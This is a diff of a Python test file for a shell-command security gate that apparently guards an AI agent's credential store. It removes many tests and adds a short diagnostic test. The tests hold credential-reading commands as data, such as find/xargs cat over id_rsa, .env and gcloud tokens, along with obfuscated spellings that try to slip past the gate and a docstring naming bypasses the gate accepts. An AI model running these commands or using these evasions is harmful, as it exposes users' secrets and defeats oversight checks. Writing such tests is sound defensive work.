-        assert security._find_substitution_openers("`x` " * 33) == 33
-        nested = "cat $(bash -c 'find ~/.kiro/crew -type f -exec cat {} +')"
-        assert security.is_sensitive_bash_command(nested)
-        assert security.is_sensitive_bash_command("echo $(date) $(pwd) $(whoami)") is None
-
-    def test_flat_backtick_spans_are_not_refused_for_the_budget(self) -> None:
-        """66 backticks are 33 substitutions, so prose full of code spans is judged.
-
-        This is the shape that made the double-count expensive: a source body's
-        docstrings are subjects of this pass (``_source_traversal_subjects``), and a
-        markdown code span is a backtick PAIR, so an ordinary docstring with 33 spans
-        read as 66 nested substitutions and refused the whole script on every fire.
-
-        The ceiling itself is unmoved -- the ``$(`` depth it exists for still refuses,
-        and a traversal hiding among the spans is still denied.
-        """
-        prose = "Mint a URL. " + " ".join(f"`field{i}`" for i in range(33))
-        assert prose.count("`") == 66
-        assert security._find_substitution_openers(prose) == 33
-        assert security.is_sensitive_bash_command(prose) is None
-
-        # The budget still refuses what it was built for: `$(` nesting is the quadratic
-        # dimension (measured 3.9 ms at depth 32, 57.1 ms at 128).
-        deep = "echo " + "$(" * 200 + "find /tmp -type f" + ")" * 200
-        assert security.is_sensitive_bash_command(deep) is not None
-
-        # And a real traversal among the spans is not laundered by them.
-        hidden = prose + " ; find ~/.kiro/crew -name '.env' -exec cat {} +"
-        assert security.is_sensitive_bash_command(hidden) is not None
-
-        # A backtick count high enough to reach the ceiling on PAIRS still refuses, so
-        # the bound is preserved rather than removed.
-        very_wide = "echo " + "`x`" * 65
-        assert security._find_substitution_openers(very_wide) == 65
-        assert security.is_sensitive_bash_command(very_wide) is not None
-
-    def test_the_store_clause_still_holds_across_many_roots(self) -> None:
-        """The store forms are resolved once for the whole call, not once per root.
-
-        They are a property of the STORE, so resolving them inside the root loop made the
-        cost the product of the two -- 24 stores at 0.42 ms per pass, paid 100 times for a
-        traversal naming 100 roots, or 42 ms of pure re-resolution in a synchronous hook
-        (measured in review). Hoisting must not change the verdict, which is what this
-        pins: the store clause still fires when the fenced root is one of many.
-        """
-        assert security.is_sensitive_bash_command(
-            "find /tmp/a /tmp/b ~ -name id_rsa -exec cat {} +"
-        )
-        assert security.is_sensitive_bash_command(
-            "find ~ /tmp/a /tmp/b -name credentials | xargs cat"
-        )
-        # and a traversal over only benign roots is still allowed
-        assert (
-            security.is_sensitive_bash_command("find /tmp/a /tmp/b -name notes.txt -exec cat {} +")
-            is None
-        )
-
-    def test_the_descoped_computed_operand_boundary_is_what_the_docs_claim(self) -> None:
-        """The scope boundary is pinned, so the prose cannot drift from the behaviour.
-
-        This pass recognises a traversal by its SPELLING. An operand the shell COMPUTES is
-        deliberately outside it -- see issue #8074 for why a spelling-based recognizer
-        cannot close that class and why the fix is to invert the polarity. These cases are
-        ALLOWED on purpose; if one of them starts denying, the boundary moved and the
-        module docs plus the PR description have to move with it.
-        """
-        for command in (
-            # the witness: knowing this runs `find` means knowing what printf writes
-            "$(printf find) ~/.kiro/crew -type f -exec cat {} +",
-            "`echo find` ~/.kiro/crew -type f -exec cat {} +",
-            # a glob-bearing root is never expanded
-            "find ~/.kir*/crew -type f -exec cat {} +",
-            # roots supplied from outside the command line, with no filter to judge
-            "find -files0-from - -type f -exec cat {} +",
-            # a name the user chose, which no curated vocabulary can hold
-            "find ~ -name github_work -exec cat {} +",
-        ):
-            assert security.is_sensitive_bash_command(command) is None, command
-
-    def test_what_the_pass_does_resolve_from_the_text_alone(self) -> None:
-        """The other side of the boundary: a computed spelling the TEXT already determines.
-
-        These are resolvable without executing anything, which is why they are in scope
-        while the cases above are not.
-        """
-        for command in (
-            "F=find; $F ~/.kiro/crew -type f -exec cat {} +",
-            "F=fin; ${F}d ~/.kiro/crew -type f -exec cat {} +",
-            "f?nd ~/.kiro/crew -type f -exec cat {} +",
-            'bash -c "find ~/.kiro/crew -type f -exec cat {} +"',
-            'echo "$(find ~/.kiro/crew -type f -exec cat {} +)"',
-        ):
-            assert security.is_sensitive_bash_command(command), command
-
-    @pytest.mark.parametrize(
-        "spelling",
-        (
-            "&>/tmp/list",
-            "&>>/tmp/list",
-            ">&/tmp/list",
-            "2>/tmp/list",
-            ">|/tmp/list",
-            ">/tmp/list",
-            ">>/tmp/list",
-        ),
-    )
-    def test_every_redirect_spelling_is_delivery_not_a_control_operator(
-        self, spelling: str
-    ) -> None:
-        """The `&`-carrying redirects matched the control-operator break, which ran first.
-
-        So ``find <fenced> -type f &>/tmp/list`` was allowed while the plain ``>`` twin
-        denied (found in review). The roots loop already ordered the two tests the other
-        way, so the pass disagreed with itself depending on which loop saw the redirect.
-        Parametrized over the spellings ``_OUTPUT_REDIRECT_RE`` enumerates, so the bound
-        is the operator set rather than the one spelling that was reported.
-        """
-        command = f"find ~/.kiro/crew -type f {spelling}"
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_a_redirect_does_not_swallow_the_command_glued_after_it(self) -> None:
-        """`>out;cat` carries the NEXT command, whose flags are not this traversal's."""
-        tokens = security.normalize_shell_command(
-            security._find_space_unquoted_operators("find ~ -type f >/tmp/out;grep -name x")
-        )
-        parsed = security._parse_find_invocation(tokens, 1)
-        assert parsed.delivers is True
-        assert parsed.name_pats == [], parsed.name_pats
-
-    @pytest.mark.parametrize(
-        "option",
-        ("-E", "-X", "-d", "-s", "-x", "-EX", "-Es", "-dsx", "-EXdsx"),
-    )
-    def test_a_bsd_preroot_option_does_not_hide_the_root(self, option: str) -> None:
-        """BSD/macOS find takes more pre-root options than GNU, and they BUNDLE.
-
-        ``find [-H|-L|-P] [-EXdsx] [-f path] [path ...] [expression]``. An unrecognised one
-        ended the roots run, so the traversal was read as rooted at ``.`` and the fenced
-        operand was never seen -- ``find -E <fenced>`` was allowed while the same command
-        without ``-E`` denied (found in review). Parametrized over the individual flags and
-        their bundles, since the bundle is the spelling a reader would not think to try.
-        """
-        command = f"find {option} ~/.kiro/crew -type f -exec cat {{}} +"
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_the_bsd_root_option_supplies_a_root_rather_than_hiding_one(self) -> None:
-        """`-f <path>` names a hierarchy to traverse, so its operand IS a root.
-
-        Skipping the flag with its operand would have lost the very path that decides the
-        verdict, so it is collected instead.
-        """
-        for command in (
-            "find -f ~/.kiro/crew -type f -exec cat {} +",
-            "find -E -f ~/.kiro/crew -type f -exec cat {} +",
-            "find -f ~/.kiro/crew -f /tmp -type f -exec cat {} +",
-        ):
-            assert security.is_sensitive_bash_command(command), command
-        # and a benign hierarchy through the same flag stays allowed. NOT rooted at
-        # `/tmp`: the test fixture puts the crew home under it, so `/tmp` is an ANCESTOR
-        # of a fenced store in CI and denying there is correct (this assertion passed
-        # locally and failed in CI for exactly that reason).
-        assert security.is_sensitive_bash_command("find -f . -name '*.py' -exec wc -l {} +") is None
-
-    def test_a_preroot_option_over_a_benign_root_is_still_allowed(self) -> None:
-        """The bound: recognising these flags must not deny an ordinary traversal.
-
-        Rooted at `.` rather than `/tmp` -- the fixture places the crew home under `/tmp`,
-        so a traversal rooted there really does reach a fenced store and denying it is
-        correct behaviour, not a false positive.
-        """
-        for command in (
-            "find -E . -name '*.py' -exec wc -l {} +",
-            "find -s . -name '*.orig' -delete",
-            "find -dsx . -name '*.md' | xargs wc -l",
-        ):
-            assert security.is_sensitive_bash_command(command) is None, command
-        # a real primary must not be mistaken for a bundle -- every primary is a word
-        assert security._find_is_bsd_preroot_option("-delete") is False
-        assert security._find_is_bsd_preroot_option("-depth") is False
-        assert security._find_is_bsd_preroot_option("-exec") is False
-        assert security._find_is_bsd_preroot_option("-EXdsx") is True
-
-    @pytest.mark.parametrize(
-        ("literal", "computed"),
-        (
-            (
-                "find ~ -name id_rsa -exec cat {} +",
-                'find ~ -name "$(printf id_rsa)" -exec cat {} +',
-            ),
-            (
-                "find ~ -name credentials -exec cat {} +",
-                'find ~ -name "$(echo credentials)" -exec cat {} +',
-            ),
-            ("find ~ -name .env -exec cat {} +", 'find ~ -name "$(printf .env)" -exec cat {} +'),
-            (
-                "find ~ -name access_tokens.db | xargs cat",
-                'find ~ -name "$(echo access_tokens.db)" | xargs cat',
-            ),
-        ),
-    )
-    def test_a_computed_filter_keeps_its_opaque_reading(self, literal: str, computed: str) -> None:
-        """The strip must not eat punctuation belonging to the TOKEN's own substitution.
-
-        A computed filter is meant to read as opaque, which makes the traversal unfiltered
-        and fails closed. `-name "$(printf id_rsa)"` lost its closing paren to the
-        capture-punctuation strip, so the leftover stopped looking like a substitution and
-        was taken as the literal name `$(printf id_rsa` -- matching nothing, and allowing a
-        read the literal spelling denies (found in review). The mechanism was never
-        missing; the strip defeated it. Both spellings must agree.
-        """
-        assert security.is_sensitive_bash_command(literal), literal
-        assert security.is_sensitive_bash_command(computed), computed
-
-    def test_the_capture_strip_still_removes_the_outer_substitutions_punctuation(self) -> None:
-        """The case the strip exists for, and the balance rule that now bounds it.
-
-        `cat $(find ~ -regex '.*/id_rsa$')` reaches `shlex` with the outer substitution's
-        paren glued to the pattern. That one is unbalanced and must still come off, while a
-        parenthesised `-regex` group must survive intact.
-        """
-        assert security._find_pattern_operand(".*/id_rsa$)") == ".*/id_rsa$"
-        assert security._find_pattern_operand(".*(id_rsa|id_dsa)$)") == ".*(id_rsa|id_dsa)$"
-        assert security._find_pattern_operand("$(printf id_rsa)") == "$(printf id_rsa)"
-        assert security._find_pattern_operand("$(printf id_rsa))") == "$(printf id_rsa)"
-        assert security._find_pattern_operand("`printf id_rsa`") == "`printf id_rsa`"
-        assert security._find_pattern_operand("`printf id_rsa``") == "`printf id_rsa`"
-
-    def test_a_stalled_path_resolution_denies_instead_of_escaping_the_gate(
-        self, monkeypatch: pytest.MonkeyPatch
-    ) -> None:
-        """`_candidate_forms` REFUSES rather than guessing, and this pass has to honour that.
-
-        A wedged mount under the path makes it raise `PathResolutionStalled`, which every
-        sibling gate turns into a denial. This pass let it escape the synchronous
-        permission gate instead, and hoisting the store resolution out of the root loop had
-        made the call eager for EVERY command rather than only those carrying a name filter
-        -- widening the crash from rare to routine (found in review, by both lanes
-        independently).
-        """
-
-        def stalled(*_args: object, **_kwargs: object) -> set[str]:
-            raise security.PathResolutionStalled("/home/u/.aws", "/home/u")
-
-        monkeypatch.setattr(security, "_candidate_forms", stalled)
-        # 1. This pass, called directly, must answer with a denial rather than raise.
-        for command in (
-            "find /tmp -type f -exec cat {} +",
-            "find /tmp -name notes.txt -exec cat {} +",
-        ):
-            named = security._check_find_traversal_reaches_fence(command)
-            assert named is not None, command
-            assert "stalled" in named, named
-        # 2. And the whole gate must still answer rather than propagate. It denies through
-        # a sibling pass here, since those catch the same exception first -- the point is
-        # that nothing escapes to the caller.
-        for command in (
-            "find /tmp -type f -exec cat {} +",
-            "find . -name '*.py' -exec wc -l {} +",
-        ):
-            assert security.is_sensitive_bash_command(command) is not None, command
-
-    def test_the_gcloud_access_token_database_is_in_the_vocabulary(self) -> None:
-        """A direct read of it already denies, so the traversal must not be more permissive.
-
-        `~/.config/gcloud/access_tokens.db` sits in a fenced directory: `cat`, `sqlite3` and
-        `cp` on that path are all refused. `find ~ -name access_tokens.db -exec cat {} +`
-        was allowed, which is the incoherence this pass exists to remove (found in review,
-        in a job log rather than on the review comment).
-        """
-        assert security.is_sensitive_bash_command("find ~ -name access_tokens.db -exec cat {} +")
-        assert security.is_sensitive_bash_command("find ~ -name 'access_tokens.db' | xargs cat")
-        # the coherence premise itself, so the reasoning above is pinned and not just prose
-        assert security.is_sensitive_bash_command("cat ~/.config/gcloud/access_tokens.db")
-
-    def test_the_gcloud_application_default_credential_is_in_the_vocabulary(self) -> None:
-        """Named for the mechanism, so it matched no `credential`-shaped entry or suffix.
-
-        The list's polarity is the one place in this pass where an omission ALLOWS, which
-        is what made this gap reachable (found in review).
-        """
-        for command in (
-            "find ~ -name application_default_credentials.json -exec cat {} +",
-            "find ~ -name 'application_default_credentials.json' | xargs cat",
-        ):
-            assert security.is_sensitive_bash_command(command), command
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            # the program word is assembled ACROSS the assignment, so no `find`
-            # substring appears anywhere in the text
-            "F=fin; ${F}d ~/.kiro/crew -type f -exec cat {} +",
-            "F=fin; ${F}d ~/.kiro/crew -type f | xargs cat",
-            "P=f; Q=ind; ${P}${Q} ~/.kiro/crew -type f -exec cat {} +",
-        ),
-    )
-    def test_a_program_word_assembled_across_an_assignment_is_still_a_traversal(
-        self, command: str
-    ) -> None:
-        """A pre-filter that models only SOME shell rewritings IS the bypass.
-
-        The bail that stood at the head of this pass removed quotes and let a glob defeat
-        it, but a word built by parameter expansion carries neither marker, so
-        ``F=fin; ${F}d`` returned before the pass ran -- while the pass it guarded
-        resolves exactly that spelling, so the un-obfuscated twin denied and this one read
-        the store (found in review). Enumerating the rewritings is open-ended, so there is
-        no pre-filter now and the verdict comes from the resolved program word.
-        """
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_a_leading_redirect_does_not_detach_the_filter_from_the_delivery(self) -> None:
-        """A redirect delivers the FILTERED listing, so the filter still bounds it.
-
-        Seeding the delivery-before-filter flag from the roots-loop ``delivers`` picked up
-        a leading redirect, so ``find >out ~ -name '*.py'`` denied while its trailing twin
-        allowed -- parse order deciding the verdict, which is what the test above exists
-        to prevent (found in review).
-        """
-        for command in (
-            "find >/tmp/out ~ -name '*.py'",
-            "find > /tmp/out ~ -name '*.py'",
-            "find ~ -name '*.py' >/tmp/out",
-        ):
-            assert security.is_sensitive_bash_command(command) is None, command
-
-    def test_a_leading_redirect_still_delivers_when_nothing_bounds_it(self) -> None:
-        """The other half of that bound, so the fix above cannot be a blanket allow."""
-        assert security.is_sensitive_bash_command("find >/tmp/out ~/.kiro/crew -type f")
-        assert security.is_sensitive_bash_command("find >/tmp/out ~ -exec cat {} + -name '*.py'")
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            # delivery BEFORE any filter: find runs it on every visited file, so the
-            # later filter narrows nothing
-            "find ~ -exec cat {} + -name '*.py'",
-            "find ~ -delete -name '*.tmp'",
-            "find ~ -print -exec cat {} + -name '*.py'",
-            # a disjunction runs the right branch where the left FAILS
-            "find ~ -name '*.py' -o -exec cat {} +",
-            "find ~ -name '*.py' -or -exec cat {} +",
-            # a negation inverts what the filter admits
-            "find ~ -not -name '*.py' -exec cat {} +",
-            "find ~ '!' -name '*.py' -exec cat {} +",
-            # a comma makes the two sides independent expressions
-            "find ~ -name '*.py' , -exec cat {} +",
-        ),
-    )
-    def test_a_filter_that_does_not_bound_the_delivery_reads_as_unfiltered(
-        self, command: str
-    ) -> None:
-        """find evaluates left to right, so POSITION decides what a filter bounds.
-
-        The parser collected every filter regardless of where it sat and treated the set
-        as narrowing the delivery, so ``find ~ -exec cat {} + -name '*.py'`` -- which cats
-        every file under the home directory -- was read as touching only ``*.py`` and
-        allowed (traced in review). Deciding which filters really bind would need find's
-        own precedence grammar; reading the traversal as unfiltered needs no grammar and
-        fails closed.
-        """
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_an_expression_whose_filter_really_does_bound_delivery_is_unaffected(self) -> None:
-        """The bound, including the idiom that makes this worth being careful about.
-
-        ``-prune -o ... -print`` is everywhere and carries a disjunction, so a rule that
-        keyed on the operator alone would be alarming -- but it only LISTS, so delivery is
-        false and the reading never matters. An ordinary filter-then-deliver traversal is
-        likewise untouched.
-        """
-        for command in (
-            "find ~ -name '*.py' -exec grep -l foo {} +",
-            "find ~ -type f -name '*.md' | xargs wc -l",
-            "find . -name node_modules -prune -o -name '*.js' -print",
-            "find ~ -name '*.orig' -delete",
-            "find ~ -type f -a -name '*.md' -exec wc -l {} +",
-        ):
-            assert security.is_sensitive_bash_command(command) is None, command
-
-    def test_the_parse_reports_whether_its_filters_bind(self) -> None:
-        """The flag itself, so the caller's reading is pinned rather than inferred."""
-
-        def parse(command: str):
-            tokens = security.normalize_shell_command(
-                security._find_space_unquoted_operators(command)
-            )
-            return security._parse_find_invocation(tokens, 1)
-
-        assert parse("find ~ -name '*.py' -exec cat {} +").filters_bind is True
-        assert parse("find ~ -exec cat {} + -name '*.py'").filters_bind is False
-        assert parse("find ~ -name '*.py' -o -exec cat {} +").filters_bind is False
-        assert parse("find ~ -not -name '*.py' -exec cat {} +").filters_bind is False
-        assert parse("find ~ -name '*.py' , -exec cat {} +").filters_bind is False
-        # an explicit AND binds exactly as the implicit one does
-        assert parse("find ~ -type f -a -name '*.md' -exec wc -l {} +").filters_bind is True
-
-    def test_a_path_pattern_matches_whatever_separator_the_probe_uses(
-        self, monkeypatch, tmp_path
-    ) -> None:
-        """The `-path` clause must not depend on the platform's path separator.
-
-        The synthetic fenced path is built with ``os.path.join``, so on Windows it carries
-        backslashes while a `-path` pattern is written in find's own spelling with forward
-        slashes -- the compiled ``.*/id_rsa`` could never match ``...\\.ssh\\id_rsa`` and
-        the entire clause was inert on that platform. The Windows shard caught it.
-
-        The bug is invisible on a POSIX box, where both spellings coincide, so the second
-        half asserts the property the fix rests on: the pattern matches the probe in EITHER
-        spelling. That is checked against the compiled matcher rather than by patching
-        ``os.path.join`` globally, which would break unrelated teardown.
-        """
-        home = tmp_path / "home"
-        (home / ".ssh").mkdir(parents=True)
-        (home / ".ssh" / "id_rsa").write_text("k\n")
-        monkeypatch.setenv("HOME", str(home))
-        monkeypatch.setenv("USERPROFILE", str(home))
-        security._home_targets_cache.clear()
-        command = f"find {home.as_posix()} -path '*/id_rsa' -exec cat {{}} +"
-        assert security.is_sensitive_bash_command(command), command
-        security._home_targets_cache.clear()
-
-        matcher = security._find_glob_matcher("*/id_rsa")
-        assert matcher is not None
-        windows_probe = "C:\\Users\\runneradmin\\.ssh\\id_rsa"
-        assert not matcher.fullmatch(windows_probe), "a backslash probe cannot match alone"
-        forms = security._credential_probe_forms(windows_probe, "\\")
-        assert any(matcher.fullmatch(form) for form in forms), forms
-        # and the POSIX side is unchanged: one spelling, still matched
-        posix_probe = "/home/x/.ssh/id_rsa"
-        assert security._credential_probe_forms(posix_probe, "/") == {posix_probe}
-        assert any(
-            matcher.fullmatch(form) for form in security._credential_probe_forms(posix_probe, "/")
-        )
-
-    def test_the_credential_leaf_test_is_answered_from_the_name_alone(self) -> None:
-        """Unit-level: the vocabulary a glob is matched against, and its bound."""
-        f = security._find_filter_names_a_credential_leaf
-        assert f(["id_rsa"], None) == "id_rsa"
-        assert f(["server.pem"], None) == "server.pem"
-        assert f(["package.json"], None) is None
-        assert f([], None) is None
-        # a glob is tested against the predicate's own vocabulary, not a directory
-        assert f([], [security._find_glob_matcher("id_*")]) is not None
-        assert f([], [security._find_glob_matcher("*.pem")]) is not None
-        assert f([], [security._find_glob_matcher("*.py")]) is None
-        assert f([], [security._find_glob_matcher("tui.js")]) is None
+        from kiro_crew.security import refusal_diagnostic
+
+        smuggled = "c" + "at ~/." + self.AWS
+        line = refusal_diagnostic(smuggled, smuggled, "abc").as_line()
+        assert "rule=unnamed component=unnamed" in line
+        assert self.AWS not in line
